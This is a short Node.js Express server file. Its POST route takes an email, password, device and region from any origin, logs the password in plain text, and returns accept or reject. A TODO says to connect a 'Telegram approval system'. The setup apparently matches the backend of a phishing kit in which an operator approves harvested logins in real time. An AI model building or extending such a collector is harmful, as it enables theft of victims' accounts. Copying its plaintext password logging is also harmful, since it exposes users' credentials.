// server.js
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for all origins
app.use(cors());

// Parse JSON bodies
app.use(bodyParser.json());

// Simulate approval system
app.post('/', async (req, res) => {
    try {
        const { email, password, device, region } = req.body;
        console.log('Login attempt:', { email, password, device, region });

        // TODO: connect your Telegram approval system here
        // For now, manually decide accept/reject
        // Example: accept if password is 'test123', otherwise reject
        const status = password === 'test123' ? 'accept' : 'reject';

        // Respond to frontend
        res.json({ status });
    } catch (err) {
        console.error('Error handling login:', err);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});

// Health check
app.get('/', (req, res) => {
  res.send('Server is running');
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

